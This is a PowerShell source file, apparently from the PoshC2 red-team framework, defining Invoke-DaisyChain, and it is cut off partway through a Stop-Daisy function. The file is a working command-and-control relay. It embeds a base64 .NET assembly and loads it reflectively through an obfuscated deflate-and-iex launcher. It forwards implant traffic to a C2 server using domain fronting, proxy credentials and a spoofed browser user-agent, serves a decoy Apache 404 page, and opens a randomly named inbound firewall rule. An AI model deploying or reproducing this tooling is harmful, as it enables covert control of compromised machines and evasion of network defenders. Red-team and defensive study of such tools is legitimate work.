<#
.Synopsis
    Invoke-DaisyChain

    Ben Turner @benpturner

.DESCRIPTION
	PS C:\> Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2server http://c2.goog.com:443 -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass -localhost (optional if low level user)
.EXAMPLE
    PS C:\> Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2server http://c2.goog.com:443 -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080
.EXAMPLE
    PS C:\> Invoke-DaisyChain -daisyserver http://10.150.10.20 -port 8888 -c2server http://10.150.10.10:8888 -URLs '"pwned/test/123","12345/drive/home.php"'
#>
$Global:firewallName = ""
$Global:serverPort = ""
function Invoke-DaisyChain {

param(
[Parameter(Mandatory=$true)][string]$port, 
[Parameter(Mandatory=$true)][string]$daisyserver,
[Parameter(Mandatory=$true)][string]$c2server, 
[Parameter(Mandatory=$true)][string]$URLs,
[Parameter(Mandatory=$false)][switch]$Localhost,
[Parameter(Mandatory=$false)][switch]$NoFWRule,
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$domfront, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyurl, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyuser, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxypassword
)


if ($psversiontable.CLRVersion.Major -lt 4)
{
    write-output "[-] DaisyServer will only work with CLRVersion 4 and above"
} else {


if ($firewallName) {
    echo "[-] DaisyServer already ran in this implant cannot run twice due to prefixes being defined"

} else {
    
$fw = Get-FirewallName -Length 15
$script:firewallName = $fw
$firewallName = $fw 
$script:serverPort = $port
$serverPort = $port

if ($Localhost.IsPresent){
echo "[+] Using localhost parameter"
$HTTPServer = "localhost"
$daisyserver = "http://localhost"
$NoFWRule = $true
} else {
$HTTPServer = "+"
}

$script:serverPort = $port

$fdsf = @"
`$URLS = $($URLS)
`$Asm = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAMPhfF4AAAAAAAAAAOAAIiALATAAAB4AAAAGAAAAAAAAsj0AAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAGA9AABPAAAAAEAAAFgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAoPAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAuB0AAAAgAAAAHgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAFgDAAAAQAAAAAQAAAAgAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAJAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACUPQAAAAAAAEgAAAACAAUALCcAAPwUAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABswBQCDAAAAAAAAAHMQAAAKgA0AAAR+DQAABG8RAAAKG40jAAABJRZyAQAAcKIlF34IAAAEoiUYchEAAHCiJRl+BwAABKIlGnIVAABwoigSAAAKbxMAAAp+DQAABCAAgAAAbxQAAAp+DQAABG8VAAAKKwUoBAAABn4BAAAELfR+DQAABG8WAAAK3gMm3gAqAAEQAAAAAAAAf38AAxAAAAEbMAIAKgAAAAAAAAB+DwAABCUtFyZ+DgAABP4GCgAABnMXAAAKJYAPAAAEKBgAAAreAybeACoAAAEQAAAAAAAAJiYAAxAAAAETMAQA4QAAAAEAABFzGQAACgp+AgAABCgaAAAKLUJzGwAACgsHfgIAAARzHAAACm8dAAAKB34DAAAEfgQAAARzHgAACm8fAAAKBxZvIAAACgcWbyEAAAoGB28iAAAKKxgGbyMAAAosEAZvIwAACigkAAAKbyUAAAp+BQAABCgaAAAKLRUGbyYAAApyGQAAcH4FAAAEbycAAAoGbyYAAApyIwAAcH4JAAAEbycAAAoGbyYAAApyOQAAcH4KAAAEbycAAApySQAAcAIoKAAACigpAAAKBm8mAAAKHxlySQAAcAIoKAAACm8qAAAKBioAAAATMAMAMwAAAAIAABF+DQAABBT+BgUAAAZzKwAACn4NAAAEbywAAAoKKC0AAAoGby4AAApvLwAACiZvMAAACioAGzAFAHIDAAADAAARFAoUCxQMFA0gECcAAI0yAAABEwR+DQAABAJvMQAAChMFKAIAAAYRBW8yAAAKbzMAAApyUQAAcG80AAAKLAYWgAEAAAR+CwAABBMGFhMHOEgCAAARBhEHmhMIEQVvMgAACm8zAAAKEQhvNAAACjkjAgAAEQgoKQAAChEFbzIAAApvNQAACm82AAAKEw0rIRENbzcAAAoTDglyhwAAcBEObzgAAAooKAAACig5AAAKDRENbzoAAAot1t4VEQ11GQAAARMPEQ8sBxEPbzsAAArcEQVvMgAACm88AAAKEwlzPQAAChMKEQkRBBYRBI5pbz4AAAoTCxELEwwrIxEKEQQWEQtvPwAAChEJEQQWEQSOaW8+AAAKEwsRDBELWBMMEQsWMNgRCm9AAAAKJdSNMgAAARME1I0yAAABJhEKFmpvQQAAChEKEQQWEQpvQAAACmlvPgAACiYRCm9CAAAKEQpvQwAAChEKb0QAAAoRBW8yAAAKb0UAAApykQAAcChGAAAKLHAJKAMAAAZ+BgAABBEFbzIAAApvMwAACig5AAAKb0cAAAoK3kx+SAAAChMQb0kAAAolLQQmFCsFb0oAAAoTERERLCAREXNLAAAKExIREm9MAAAKExDeDBESLAcREm87AAAK3BEQCt4JJn4MAAAECt4AEQVvMgAACm9FAAAKcpkAAHAoRgAACixyCSgDAAAGfgYAAAQRBW8yAAAKbzMAAAooOQAAChEEb00AAAoL3kx+SAAAChMTb0kAAAolLQQmFCsFb0oAAAoTFBEULCARFHNLAAAKExURFW9MAAAKExPeDBEVLAcRFW87AAAK3BETCt4JJn4MAAAECt4ABywIB44sBAcMKx8oTgAACgZvTwAACgwrEREHF1gTBxEHEQaOaT+t/f//CC0QKE4AAAp+DAAABG9PAAAKDBEFb1AAAAogyAAAAG9RAAAKEQVvUAAACm9SAAAKcqMAAHByvQAAcG8nAAAKEQVvUAAACm9SAAAKcgUBAHByEwEAcG8nAAAKEQVvUAAACm9SAAAKciUBAHByNQEAcG8nAAAKEQVvUAAACnI5AQBwb1MAAAoRBW9QAAAKb1QAAAolCBYIjmlvPwAACm9DAAAKFAwUCxQKEQVvUAAACm9VAAAK3hUTFnI/AQBwERYoKAAACigpAAAK3gAqAABBxAAAAgAAAIwAAAAuAAAAugAAABUAAAAAAAAAAgAAAM0BAAALAAAA2AEAAAwAAAAAAAAAAAAAAIIBAAAkAAAApgEAAEMAAAAcAAABAAAAAIIBAAAkAAAA6QEAAAkAAAAbAAABAgAAAFcCAAALAAAAYgIAAAwAAAAAAAAAAAAAAAoCAAAmAAAAMAIAAEMAAAAcAAABAAAAAAoCAAAmAAAAcwIAAAkAAAAbAAABAAAAAAAAAABcAwAAXAMAABUAAAAbAAABHgIoVgAACioTMAEAWgAAAAAAAAAXgAEAAAQUgAIAAAQUgAMAAAQUgAQAAAQUgAUAAAQUgAYAAAQUgAcAAAQUgAgAAARyZQEAcIAJAAAEcv4BAHCACgAABBaNIwAAAYALAAAEcgACAHCADAAABCoucwkAAAaADgAABCoKFyoAAABCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAACIBQAAI34AAPQFAACUCAAAI1N0cmluZ3MAAAAAiA4AAAQEAAAjVVMAjBIAABAAAAAjR1VJRAAAAJwSAABgAgAAI0Jsb2IAAAAAAAAAAgAAAVcdAgAJAgAAAPoBMwAWAAABAAAAOAAAAAMAAAAPAAAACgAAAAYAAABWAAAAAQAAAA8AAAADAAAAAQAAAAIAAAABAAAAAAD5AwEAAAAAAAYAagL/BQYA1wL/BQYAngHNBQ8AHwYAAAYAxgFoBAYATQJoBAYALgJoBAYAvgJoBAYAigJoBAYAowJoBAYA3QFoBAYAsgHgBQYAkAHgBQYAEQJoBAYA+AEUAwYAUwdXBAoAYgVaBwoAgwdaBwoAiAhaBwYAZQdXBAoA/QdaBwYAUARFAAYASgRFAAYAoQUKBwYA3ABXBAYAFwVFAAYA4ARXBAoA3QRaBwYAdQH/BQoAcwNRCAYAXwFUBgoAXgRUBgoAKQdRCAoAswRaBwYAPwNXBAoAPgZaBwoAQQVaBwoAYQNXBAoA5wNaBwoAswZaBwoAhwhaBwoAxQBaBwoAnwRaBwoAiwRwAAYA/ABXBAoABQVaBwYAZQNXBAoARgPNBQYA8QD6AgYA9QJXBAoAxQdaBwoAegRaBwoAIwFaBwYAJAVFAAYACwPxBwoALwFaBwAAAAA8AAAAAAABAAEAAQAQAIoFAABBAAEAAQADIRAAYwAAAEEADgAIABYAVQVRARYADgQfARYAgAUfARYAqAAfARYALwUfARYAmgUfARYAnwcfARYAlgUfARYAeQcfARYAeAUfARYAyAVUARYARAEfAREAbwVYATYAOABcARYAAQBgAVAgAAAAAJYAOghkAQEA8CAAAAAAkQCCBmQBAQA4IQAAAACRALoHaAEBACgiAAAAAJEA2QdkAQIAaCIAAAAAkQC/A24BAgCsJgAAAACGGLsFBgADALQmAAAAAJEYwQVkAQMAGicAAAAAkRjBBWQBAwCsJgAAAACGGLsFBgADACYnAAAAAIMACwB0AQMAEBABANUAAAABAHIHAAABAJEIAAACAI8IAAADADgIAAAEADYICQC7BQEAEQC7BQYAGQC7BQoAKQC7BRAAMQC7BRAAOQC7BRAAQQC7BRAASQC7BRAAUQC7BRAAWQC7BRAAYQC7BRUAaQC7BRAAcQC7BRAAeQC7BRAA6QC7BQYAiQC7BQYAiQCmBhoAGQFFByAAEQFsABAAiQA6BiYAiQCZBwYAiQAABQYA8QC7BS0AKQGXAzMAkQC7BQYAGQFlCEAAmQC7BQYAMQG7BRAAmQA5B0UAOQG7BUwAmQDABlIAmQDnBhUAmQDQAxUAkQB9CFkAkQBzCGAAUQHQBmYASQHABlIAkQAdB2wAYQFsAEwAGQFMB3IAaQEMAXgAWQFsAH0AeQG7BS0AiQAfCIoAgQEvCJMAoQDoAJkAiQEEAZ8AgQEABQYAiQARCMsAqQCuB9IAmQEDBNgAGQEBB9wAmQEuBuEAoQGtBecAwQCNB+wAgQA9A9gAGQFFB/AAwQDoB58AyQBXAQYAmQEpBPYAuQC7BQYAsQBnAPsAsQBvAQMBsQBWAwsBsQDQBA8BsQBQAwYAsQBRAQYAsQBXAQYAmQGZANgAGQFFCBQBkQAuAxoBGQFtCB8B4QAWASIBqQEXBPYA0QC7BSgBsQGPANgAkQBPAC4BuQEvADYBuQGdBjwBqQAWAUIBwQG2AAEAwQEdB2wAwQHqBBAAwQE5BPYAwQFRAQYAgQC7BQYADgAFAAAALgALAIEBLgATAIoBLgAbAKkBLgAjALIBLgArAL0BLgAzAL0BLgA7AL0BLgBDALIBLgBLAMMBLgBTAL0BLgBbAL0BLgBjANsBLgBrAAUCLgBzABICYwB7AFoCOQCFAKMABIAAAAEAAAAAAAAAAAAAAAAAPwgAAAQAAAAAAAAAAAAAAEgBWgAAAAAABAAAAAAAAAAAAAAASAFXBAAAAAADAAIAAAAAPD45X18xNF8wADxBbGxvd1VudHJ1c3RlZENlcnRpZmljYXRlcz5iX18xNF8wAGdldF9VVEY4ADw+OQA8TW9kdWxlPgBTeXN0ZW0uSU8AVXBsb2FkRGF0YQBtc2NvcmxpYgA8PmMAUmVhZABBZGQAU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkAFJlYWRUb0VuZABnZXRfSHR0cE1ldGhvZABwcm94eXBhc3N3b3JkAHNldF9TdGF0dXNDb2RlAENyZWRlbnRpYWxDYWNoZQBjb29raWUASURpc3Bvc2FibGUAZ2V0X0FzeW5jV2FpdEhhbmRsZQBDb25zb2xlAFdhaXRPbmUAV3JpdGVMaW5lAGdldF9SZXNwb25zZQBXZWJSZXNwb25zZQBIdHRwTGlzdGVuZXJSZXNwb25zZQBodHRwcmVzcG9uc2UAQ2xvc2UARGlzcG9zZQBYNTA5Q2VydGlmaWNhdGUAV3JpdGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBTeXN0ZW0uVGhyZWFkaW5nAEVuY29kaW5nAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcARG93bmxvYWRTdHJpbmcAVG9TdHJpbmcAU3RvcHdhdGNoAEZsdXNoAGdldF9MZW5ndGgAVXJpAEFzeW5jQ2FsbGJhY2sAUmVtb3RlQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sAc2V0X1NlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrAExpc3RlbmVyQ2FsbGJhY2sAc2V0X0J5cGFzc1Byb3h5T25Mb2NhbABOZXR3b3JrQ3JlZGVudGlhbABEYWlzeS5kbGwAZ2V0X1Jhd1VybABwcm94eXVybABHZXRSZXNwb25zZVN0cmVhbQBnZXRfSW5wdXRTdHJlYW0AZ2V0X091dHB1dFN0cmVhbQBNZW1vcnlTdHJlYW0AU3lzdGVtAFg1MDlDaGFpbgBTeXN0ZW0uUmVmbGVjdGlvbgBDb29raWVDb2xsZWN0aW9uAE5hbWVWYWx1ZUNvbGxlY3Rpb24AV2ViSGVhZGVyQ29sbGVjdGlvbgBIdHRwTGlzdGVuZXJQcmVmaXhDb2xsZWN0aW9uAHNldF9Qb3NpdGlvbgBXZWJFeGNlcHRpb24Ac2V0X1N0YXR1c0Rlc2NyaXB0aW9uAFN0b3AASHR0cFJlcXVlc3RIZWFkZXIAU3RyZWFtUmVhZGVyAFRleHRSZWFkZXIAZG9tYWluZnJvbnRoZWFkZXIAU2VydmljZVBvaW50TWFuYWdlcgBib29sTGlzdGVuZXIASHR0cExpc3RlbmVyAGxpc3RlbmVyAHJlZmVyZXIAcHJveHl1c2VyAERhaXN5U2VydmVyAGh0dHBzZXJ2ZXIASUVudW1lcmF0b3IAR2V0RW51bWVyYXRvcgAuY3RvcgAuY2N0b3IAVVJMcwBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAZ2V0X0Nvb2tpZXMAc2V0X0F1dGhlbnRpY2F0aW9uU2NoZW1lcwBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Llg1MDlDZXJ0aWZpY2F0ZXMAQWxsb3dVbnRydXN0ZWRDZXJ0aWZpY2F0ZXMAR2V0Qnl0ZXMAZ2V0X1ByZWZpeGVzAElDcmVkZW50aWFscwBzZXRfQ3JlZGVudGlhbHMAZ2V0X0RlZmF1bHRDcmVkZW50aWFscwBzZXRfVXNlRGVmYXVsdENyZWRlbnRpYWxzAENvbnRhaW5zAFN5c3RlbS5Db2xsZWN0aW9ucwBnZXRfSGVhZGVycwBTc2xQb2xpY3lFcnJvcnMAc2V0X0FkZHJlc3MAQ29uY2F0AEZvcm1hdABPYmplY3QAU3lzdGVtLk5ldABJQXN5bmNSZXN1bHQAcmVzdWx0AHVzZXJhZ2VudABXZWJDbGllbnQAZ2V0X0N1cnJlbnQAU3RhcnQAaHR0cHNlcnZlcnBvcnQAZ2V0X1JlcXVlc3QAV2ViUmVxdWVzdABIdHRwTGlzdGVuZXJSZXF1ZXN0AFByb2Nlc3NSZXF1ZXN0AE1vdmVOZXh0AFN5c3RlbS5UZXh0AEh0dHBMaXN0ZW5lckNvbnRleHQARW5kR2V0Q29udGV4dABCZWdpbkdldENvbnRleHQAU3RhcnROZXcAeABTdGFydERhaXN5AG9wX0VxdWFsaXR5AFN5c3RlbS5OZXQuU2VjdXJpdHkASXNOdWxsT3JFbXB0eQBnZXRfUHJveHkAc2V0X1Byb3h5AElXZWJQcm94eQB6AAAAD2gAdAB0AHAAOgAvAC8AAAM6AAADLwAACUgAbwBzAHQAABVVAHMAZQByAC0AQQBnAGUAbgB0AAEPUgBlAGYAZQByAGUAcgAAB3sAMAB9AAA1LwBwAGwAdQBnAGkAbgBzAC8ANwA3AC8AdgAxAC4AMAAvAHMAdABhAHQAcwAuAHAAaABwAAAJewAwAH0AOwAAB0cARQBUAAAJUABPAFMAVAAAGUMAYQBjAGgAZQBDAG8AbgB0AHIAbwBsAABHbgBvAC0AYwBhAGMAaABlACwAIABuAG8ALQBzAHQAbwByAGUALAAgAG0AdQBzAHQALQByAGUAdgBhAGwAaQBkAGEAdABlAAENUAByAGEAZwBtAGEAABFuAG8ALQBjAGEAYwBoAGUAAQ9FAHgAcABpAHIAZQBzAAADMAAABU8ASwAAJUcAZQBuAGUAcgBpAGMAIABlAHIAcgBvAHIAOgAgAHsAMAB9AACAl00AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAzADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAVABvAHUAYwBoADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvAAABAIH/PAAhAEQATwBDAFQAWQBQAEUAIABIAFQATQBMACAAUABVAEIATABJAEMAIAAiAC0ALwAvAEkARQBUAEYALwAvAEQAVABEACAASABUAE0ATAAgADIALgAwAC8ALwBFAE4AIgA+AA0ACgA8AGgAdABtAGwAPgA8AGgAZQBhAGQAPgANAAoAPAB0AGkAdABsAGUAPgA0ADAANAAgAE4AbwB0ACAARgBvAHUAbgBkADwALwB0AGkAdABsAGUAPgANAAoAPAAvAGgAZQBhAGQAPgA8AGIAbwBkAHkAPgANAAoAPABoADEAPgBOAG8AdAAgAEYAbwB1AG4AZAA8AC8AaAAxAD4ADQAKADwAcAA+AFQAaABlACAAcgBlAHEAdQBlAHMAdABlAGQAIABVAFIATAAnAHMAIAB3AGEAcwAgAG4AbwB0ACAAZgBvAHUAbgBkACAAbwBuACAAdABoAGkAcwAgAHMAZQByAHYAZQByAC4APAAvAHAAPgANAAoAPABoAHIAPgANAAoAPABhAGQAZAByAGUAcwBzAD4AQQBwAGEAYwBoAGUAIAAoAEQAZQBiAGkAYQBuACkAIABTAGUAcgB2AGUAcgAhADwALwBhAGQAZAByAGUAcwBzAD4ADQAKADwALwBiAG8AZAB5AD4APAAvAGgAdABtAGwAPgANAAoAAQAAAFj4nJBoie1DshBhkZoh+boABCABAQgDIAABBSABARERBCABAQ4EIAEBAgUgABKAiQUAAQ4dDgYgAQERgJEFIAIBHBgFAAEBEnkGBwISSRJNBAABAg4GIAEBEoCZBSACAQ4OBiABARKA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ZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAwAAAC0PQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
`$DllBytes  = [System.Convert]::FromBase64String(`$Asm)
`$Assembly = [System.Reflection.Assembly]::Load(`$DllBytes)
`$DaisyServer = New-Object DaisyServer
[DaisyServer]::server = "${c2server}"
[DaisyServer]::httpserverport = "$port"
[DaisyServer]::httpserver = "$HTTPServer"
[DaisyServer]::useragent = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
[DaisyServer]::URLs = @($($URLS))
[DaisyServer]::proxyurl = "$proxyurl"
[DaisyServer]::proxyuser = "$proxyuser"
[DaisyServer]::proxypassword = "$proxypassword"
[DaisyServer]::domainfrontheader = "$domfront"
[DaisyServer]::referer = `$null
[DaisyServer]::StartDaisy()
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

if ($domfront -and (($psversiontable.CLRVersion.Major -lt 3))) {
    echo "[-] When using domain fronting and daisy chaining the .NET version needs to be v4 or above"
} 


$t = Invoke-Netstat| ? {$_.ListeningPort -eq $port}
$global:kill = [HashTable]::Synchronized(@{})
$kill.log = "1"

if ($NoFWRule.IsPresent) {
    echo "No firewall rule added"
}else {
    echo "Adding firewall rule name: $firewallName for TCP port $port"
    echo "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
    Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes
}

if (!$t) { 
    if (Test-Administrator) { 
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null
        echo ""
        echo "[+] Running DaisyServer as Administrator:"
    } else {
        if(!$Localhost.IsPresent)
        {
            echo "[+] Running DaisyServer as Standard User, must use -localhost flag for this to work. Aborting."
            echo ""
            return
        }
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null 
        echo "[+] Running DaisyServer as Standard User on localhost"
        echo ""
        
    }  

    echo "[+] To stop the Daisy Server, run StopDaisy in the current process"
}
    
}


}


}
function Stop-Daisy {    
    try {
        $webClient = New-Object System.Net.WebClient
